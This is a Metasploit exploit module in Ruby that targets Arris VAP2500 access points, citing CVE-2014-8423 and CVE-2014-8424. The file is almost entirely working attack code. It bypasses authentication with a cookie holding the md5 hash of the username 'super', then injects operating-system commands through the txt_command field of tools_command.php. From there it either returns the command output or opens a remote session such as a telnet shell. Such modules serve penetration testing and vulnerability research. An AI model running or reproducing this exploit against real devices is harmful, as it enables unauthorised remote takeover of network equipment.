# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Arris VAP2500 tools_command.php Command Execution&#039;,
      &#039;Description&#039; => %q{
        Arris VAP2500 access points are vulnerable to OS command injection in the web management
        portal via the tools_command.php page. Though authentication is required to access this
        page, it is trivially bypassed by setting the value of a cookie to an md5 hash of a valid
        username.
      },
      &#039;Author&#039;      =>
        [
          &#039;HeadlessZeke&#039; # Vulnerability discovery and Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2014-8423&#039;],
          [&#039;CVE&#039;, &#039;2014-8424&#039;],
          [&#039;OSVDB&#039;, &#039;115045&#039;],
          [&#039;OSVDB&#039;, &#039;115046&#039;],
          [&#039;BID&#039;, &#039;71297&#039;],
          [&#039;BID&#039;, &#039;71299&#039;],
          [&#039;URL&#039;, &#039;http://goto.fail/blog/2014/11/25/at-and-t-u-verse-vap2500-the-passwords-they-do-nothing/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 25 2014&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 1024,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic telnet&#039;
            }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;DefaultTarget&#039; => 0
      ))
  end

  def check
    begin
      res = send_request_raw({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => &#039;/tools_command.php&#039;,
        &#039;cookie&#039; => "p=#{Rex::Text.md5(&#039;super&#039;)}"
      })
      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/
        return Exploit::CheckCode::Vulnerable
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Trying to access the device ...")

    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "#{peer} - Failed to access the vulnerable device")
    end

    print_status("#{peer} - Exploiting...")

    if datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
      exploit_cmd
    else
      exploit_session
    end
  end

  def exploit_cmd
    beg_boundary = rand_text_alpha(8)
    end_boundary = rand_text_alpha(8)

    begin
      res = send_request_cgi({
        &#039;uri&#039;    => normalize_uri(&#039;/&#039;, &#039;tools_command.php&#039;),
        &#039;vars_post&#039; => {
          &#039;cmb_header&#039;  => &#039;&#039;,
          &#039;txt_command&#039; => "echo #{beg_boundary}; #{payload.encoded}; echo #{end_boundary}"
        },
        &#039;method&#039; => &#039;POST&#039;,
        &#039;cookie&#039; => "p=#{Rex::Text.md5(&#039;super&#039;)}"
      })

      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/
        print_good("#{peer} - Command sent successfully")
        if res.body.to_s =~ /#{beg_boundary}(.*)#{end_boundary}/m
          print_status("#{peer} - Command output: #{$1}")
        end
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Command execution failed")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def exploit_session
    begin
      send_request_cgi({
        &#039;uri&#039;    => normalize_uri(&#039;/&#039;, &#039;tools_command.php&#039;),
        &#039;vars_post&#039; => {
         &#039;cmb_header&#039;  => &#039;&#039;,
         &#039;txt_command&#039; => "#{payload.encoded}"
        },
        &#039;method&#039; => &#039;POST&#039;,
        &#039;cookie&#039; => "p=#{Rex::Text.md5(&#039;super&#039;)}"
      }, 3)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

